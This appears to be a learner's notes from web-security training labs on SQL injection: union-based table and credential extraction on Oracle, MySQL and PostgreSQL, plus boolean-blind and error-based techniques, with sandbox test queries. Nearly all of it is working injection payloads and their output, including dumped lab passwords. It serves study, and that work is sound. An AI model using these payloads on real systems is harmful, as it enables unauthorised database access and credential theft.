## basic extraction
### oracle
```
Pets'+or+'1'%3d'1
Pets'+or+'1'%3d'1'--
Pets'+or+'1'%3d'1'+order+by+2--
Pets'+union+select+null,null+from+dual--
Pets'+union+select+banner,null+from+v$version--

Pets'+union+select+sys.database_name,null+from+dual--

XE

Pets'+union+select+distinct+owner,null+from+all_tables--

APEX_040000
CTXSYS
MDSYS
PETER
SYS
SYSTEM
XDB

Pets'+union+select+table_name,null+from+all_tables--

APP_ROLE_MEMBERSHIP
APP_USERS_AND_ROLES
OL$HINTS
PRODUCTS
SRSNAMESPACE_TABLE
USERS_MENQLQ

Pets'+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_MENQLQ'--

USERNAME_PSMOBC
PASSWORD_WCMRQS

Pets'+union+select+concat(concat(USERNAME_PSMOBC,':'),PASSWORD_WCMRQS),null+from+USERS_MENQLQ--

administrator:5wu1j2bbimkqjr2okahv
carlos:mezumukqieuo35oh4rrk
wiener:u2phy3832cz7ql96el69
```
### mysql
```
Pets'+or+'1'%3d'1'#
Pets'+or+'1'%3d'1'+order+by+2#
Pets'+union+select+null,null#
Pets'+union+select+version(),null#
```
### general - use comment and version() to try and determine database - this one turned out to be postgresql
```
# initial enum
Pets'+or+'1'%3d'1'--
Pets'+or+'1'%3d'1'+order+by+2--
Pets'+union+select+null,null--
Pets'+union+select+version(),null--

PostgreSQL 12.13 (Ubuntu 12.13-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit

# all databases
Pets'+union+select+datname,'nada'+from+pg_database--

postgres
academy_labs
template1
template0

# current database
Pets'+union+select+current_database(),'nada'+from+pg_database--

academy_labs

# tables in specific database
Pets'+union+select+table_name,'nada'+from+information_schema.tables+where+database_name='academy_labs'--

error <<-- to list tables / do anything on another database, need to use DBlink

# tables in current database
Pets'+union+select+tablename,'nada'+from+pg_catalog.pg_tables--

sql_languages
pg_opfamily
pg_database
pg_operator
pg_shdepend
pg_user_mapping
pg_aggregate
pg_shseclabel
pg_sequence
pg_foreign_table
pg_statistic
pg_db_role_setting
pg_type
pg_seclabel
pg_index
pg_subscription_rel
pg_range
pg_foreign_data_wrapper
pg_attrdef
pg_replication_origin
pg_ts_parser
pg_authid
pg_auth_members
users_ftxqoe


# another way - results are slightly different
Pets'+union+select+table_name,'nada'+from+information_schema.tables--

column_privileges
pg_stat_sys_tables
pg_stat_progress_vacuum
pg_policies
foreign_servers
pg_opfamily
pg_operator
table_constraints
attributes
pg_shdepend
pg_aggregate
users_ftxqoe
products
administrable_role_authorizations
user_mappings
domains
foreign_server_options
column_column_usage
collations
pg_user
routines

# columns
Pets'+union+select+column_name,'nada'+from+information_schema.columns+where+table_name='users_fmnebg'--

password_nruxzf
username_wdkxnv

# pwn
Pets'+union+select+concat(username_wdkxnv,':',password_nruxzf),'nada'+from+users_fmnebg--

carlos:01znvxvuiqopwydfln92
wiener:mdcn7w1my9mdpnoc0l6m
administrator:7qpk90futuka5actprm7
```

## blind
### conditional responses
```
# first thing to note (man ascii, printable chars, DEC values):
special chars:    32 - 47
numbers (0-9):    48 - 57
special chars 2:  58 - 64
uppercase:        65 - 90
special chars 3:  91 - 96
lowercase:        97 - 122
special chars 4:  123 - 126

# cookie
TrackingId=sAt3guUqk4rPAa6E'+AND+'1'='1 <<-- 5096 bytes
TrackingId=sAt3guUqk4rPAa6E'+AND+'1'='2 <<-- 5035 bytes

# use Comparer:
# TRUE: "Welcome back" in response 
# FALSE: "Welcome back" not in response

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'A'),1,1))=65+AND+'1'='1 <<-- true

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'B'),1,1))=66+AND+'1'='1 <<-- true

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+'A'),1,1))=66+AND+'1'='1 <<-- false <<-- we got em

# prep for version()

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=66+AND+'1'='1

# target "66"

TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=§66§+AND+'1'='1

# use ascii-printable.txt

# increase POS (2,3,4,...)
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),POS,1))=§66§+AND+'1'='1

80   P
111  o
115  s
116  t
103  g

# ok postgres, now database (note: no need "from pg_database")
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+current_database()),1,1))=97+AND+'1'='1

97   a
99   c
97   a
100  d
101  e
109  m
121  y
95   _
108  l
97   a
98   b
115  s

# improvement: no need tail "AND 1=1", just comment and cut short
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+version()),1,1))=80--

# tables
table_name from information_schema.tables <<-- didn't work
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+concat(table_name,':')+from+information_schema.tables),1,1))=97--

# troubleshooting
# this one ok
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+concat(version(),':')),1,1))=§97§--

# user
TrackingId=obviouslywrong'+OR+ASCII(SUBSTRING((SELECT+user),1,1))=§80§--

112

# troubleshooting
# this one didn't
TrackingId=obviouslywrong'+OR+(SELECT+'a'+FROM+users)='a

# this one works (key: LIMIT 1)
TrackingId=obviouslywrong'+OR+(SELECT+'a'+FROM+users+LIMIT+1)='a

# ascii
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring('a',1,1))+FROM+users+LIMIT+1)=97--

# substring
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring('ab',2,1))+FROM+users+LIMIT+1)=97--;

# string_agg
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(username,':'),1,1))+FROM+users+LIMIT+1)=97--;

# tables <<-- worked
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(tablename,':'),1,1))+FROM+pg_catalog.pg_tables+LIMIT+1)=97--;

117  u
115  s
101  e
114  r
115  s
58   :
112  p
103  g
95   _
115  s
116  t
97   a
116  t
105  i
115  s

# columns
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(column_name,':'),1,1))+FROM+information_schema.columns+where+table_name='users'+LIMIT+1)=97--;

117  u
115  s
101  

# pwn
TrackingId=obviouslywrong'+OR+(SELECT+ascii(substring(string_agg(username||':'||password,','),1,1))+FROM+users+LIMIT+1)=97--;

97   a
100  d
```
### conditional errors
```
TrackingId=obviouslywrong' <<-- 500 error
TrackingId=obviouslywrong'' <<-- 200 OK

# confirm if error is caused by sql query
TrackingId=obviouslywrong'+or+'1'='2 <<-- 200 OK
TrackingId=obviouslywrong'+or+'1'='2' <<-- 500 error

# since '1'='2' is FALSE but returns 200 OK, and an extra quote returns 500 error, looks like it's SQL query formatting that caused the different responses

# try casting errors - didn't try in the end
TrackingId=obviouslywrong'+or+'1'='2

# try normal queries
TrackingId=obviouslywrong'+or+'1'='2'+order+by+1-- <<-- OK
TrackingId=obviouslywrong'+union+select+version()-- <<-- 500 error
TrackingId=obviouslywrong'+union+select+banner+from+v$version-- <<-- OK; Oracle

# oracle extraction
TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+from+dual),1,1))+from+dual)=98+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)||'
#200 OK

TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+from+dual),1,1))+from+dual)=97+THEN+to_char(1/0)+ELSE+'a'+END+FROM+dual)||'
#500 error <<-- nice


``` 


# drafts
oracle tests
```
# http://sqlfiddle.com/#!9/649e74/5
# schema
create table scientist (id integer, firstname varchar(100), lastname varchar(100));
insert into scientist (id, firstname, lastname) values (1, 'albert', 'einstein');
insert into scientist (id, firstname, lastname) values (2, 'isaac', 'newton');
insert into scientist (id, firstname, lastname) values (3, 'marie', 'curie');

# query
select firstname from scientist;
select firstname from scientist where firstname like 'a%';
select firstname from scientist where firstname like 'a%' or '1'='1';
select firstname from scientist where firstname like 'a%' and (select ascii(substr((select 'a' from dual),1,1)) from dual)=97
select firstname from scientist where firstname like 'a%' and (select substr((select 'a' from dual),1,1) from dual)=chr(97)

# cast <<-- inner "as integer" won't allow "else 'string'"
SELECT CAST ((9) AS INTEGER) int FROM DUAL
SELECT CAST ((9) AS CHAR) int FROM DUAL
SELECT CAST ((SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual) AS INTEGER) int FROM DUAL
SELECT CAST ((SELECT CASE WHEN 1=1 THEN 1 ELSE 'A' END FROM dual) AS INTEGER) int FROM DUAL
# ORA-00932: inconsistent datatypes: expected NUMBER got CHAR

# to_char
SELECT CASE WHEN 1=1 THEN to_char(1/0) ELSE '' END FROM dual
#ORA-01476: divisor is equal to zero

SELECT CASE WHEN 1=2 THEN to_char(1/0) ELSE '' END FROM dual
#(null) <<-- OK

SELECT CASE WHEN (select substr((select 'a' from dual),1,1) from dual)=chr(97) THEN to_char(1/0) ELSE '' END FROM dual
##ORA-01476: divisor is equal to zero <<-- nice

SELECT CASE WHEN (select substr((select 'a' from dual),1,1) from dual)=chr(98) THEN to_char(1/0) ELSE '' END FROM dual
#(null) <<-- OK

SELECT CASE WHEN (select ascii(substr((select 'a' from dual),1,1)) from dual)=98 THEN to_char(1/0) ELSE '' END FROM dual
#(null) <<-- OK
```
postgresql tests
```
# postgresql testing (https://extendsclass.com/postgresql-online.html)

# all rows (note: 'or')
select firstname from scientist where firstname = 'albert' or ascii(substring((select 'a'),1,1))=97;

# one row (note: 'and')
select firstname from scientist where firstname = 'albert' and ascii(substring((select 'a'),1,1))=97;

# no result ('and', and intentionally wrong)
select firstname from scientist where firstname = 'albert' and ascii(substring((select 'b'),1,1))=97;

# testing
select tablename from pg_catalog.pg_tables; <<-- works

select string_agg(tablename,':') from pg_catalog.pg_tables <<-- works

# string_agg
select firstname from scientist where firstname = 'albert' and ascii(substring((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1))=115; <<-- works

select firstname from scientist where firstname = 'albert' and ascii(substring((select string_agg(tablename,':') from pg_catalog.pg_tables),1,1))=116; <<-- no result (deliberate)

# try now <<-- didn't work
TrackingId=obviouslywrong'+AND+ASCII(SUBSTRING((select+string_agg(tablename,':')+from+pg_catalog.pg_tables),1,1))=80--

# string_agg multiple columns
select string_agg(firstname||':'|| lastname,',') from scientist;
```
